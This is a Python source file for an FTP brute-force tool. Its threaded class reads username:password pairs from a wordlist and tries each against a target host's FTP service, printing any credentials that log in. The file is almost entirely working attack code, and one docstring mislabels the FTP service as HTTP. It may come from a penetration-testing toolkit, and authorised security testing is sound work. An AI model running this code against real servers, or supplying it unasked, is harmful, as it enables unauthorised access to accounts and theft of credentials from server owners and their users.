import ftplib
import os
import threading
from .misc import *


class FTPBrute(threading.Thread):
    def __init__(self, target):
        """
        Default constructor.
        :param:
        :return:
        """
        threading.Thread.__init__(self)
        self.target = target
        self.port = 21

    def ftp_brute(self, hostname, username, password):
        """"
        Runs the HTTP brute force function on the HTTP service.
        :param hostname:
        :param username:
        :param password:
        :return True:
        """
        # Initializing FTP client.
        client = ftplib.FTP()

        try:
            # Connecting to FTP server.
            client.connect(hostname, self.port, timeout=5)

            # Login using the credentials.
            client.login(username, password)
        except ftplib.error_perm:
            # Incorrect credentials
            pass
        else:
            # Connection has been established.
            print(print_green(f"\n[!] [FTP] Found credentials:\n\tHostname: {hostname}\n\tUsername: "
                              f"{username}\n\tPassword: {password}"))
            return True

    def run(self):
        """"
        Reads the wordlist and runs the brute force function on the ftp service.
        :param: self.
        :return:
        """
        # Read the file.
        parent_dir = os.getcwd()
        wordlist_path = os.path.join(parent_dir, "data", "wordlists", "ftp_wordlist.txt")
        cred_list = open(wordlist_path).read().splitlines()

        # Start the brute force.
        for cred in cred_list:
            username = cred.split(':')[0]
            password = cred.split(':')[1]

            if self.ftp_brute(self.target, username, password):
                break
